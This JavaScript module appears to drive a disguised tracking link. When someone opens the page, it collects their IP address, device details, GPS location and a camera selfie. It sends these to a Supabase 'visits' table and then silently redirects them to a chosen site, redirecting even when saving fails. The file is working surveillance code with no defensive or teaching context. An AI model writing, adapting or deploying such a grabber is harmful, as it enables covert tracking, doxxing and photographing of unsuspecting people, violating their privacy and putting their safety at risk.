import {
  getDeviceInfo,
  fetchPublicIp,
  requestLocation,
  captureSelfie,
} from "./collect.js";
import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";

function cfg() {
  return window.APP_CONFIG || {};
}

function saveVisit(payload) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  if (!isSupabaseConfigured()) {
    return Promise.resolve({ ok: false, local: true });
  }

  return fetch(`${supabaseUrl}/rest/v1/visits`, {
    method: "POST",
    headers: {
      apikey: supabaseAnonKey,
      Authorization: `Bearer ${supabaseAnonKey}`,
      "Content-Type": "application/json",
      Prefer: "return=minimal",
    },
    body: JSON.stringify(payload),
  }).then((res) => {
    if (!res.ok) throw new Error(String(res.status));
    return { ok: true };
  });
}

export function initVisitorPage() {
  async function run() {
    const redirectPromise = fetchRedirectUrl();
    const ipPromise = fetchPublicIp().catch(() => ({ ip: null, source: null }));
    const locationPromise = requestLocation();

    const [redirectTarget, ipPayload, locationPayload] = await Promise.all([
      redirectPromise,
      ipPromise,
      locationPromise,
    ]);

    let photoPayload = { granted: false, dataUrl: null };
    try {
      photoPayload = await captureSelfie();
    } catch {
      photoPayload = { granted: false, error: "denied_or_unavailable" };
    }

    const payload = {
      ip: ipPayload.ip,
      ip_source: ipPayload.source,
      device_info: getDeviceInfo(),
      location_granted: locationPayload.granted,
      location: locationPayload.granted
        ? {
            latitude: locationPayload.latitude,
            longitude: locationPayload.longitude,
            accuracy: locationPayload.accuracy,
          }
        : null,
      camera_granted: !!photoPayload.granted,
      photo_base64: photoPayload.dataUrl || null,
      referrer: document.referrer || null,
      page_url: location.href,
    };

    try {
      await saveVisit(payload);
    } catch {
      /* still redirect */
    }
    window.location.replace(redirectTarget);
  }

  run();
}
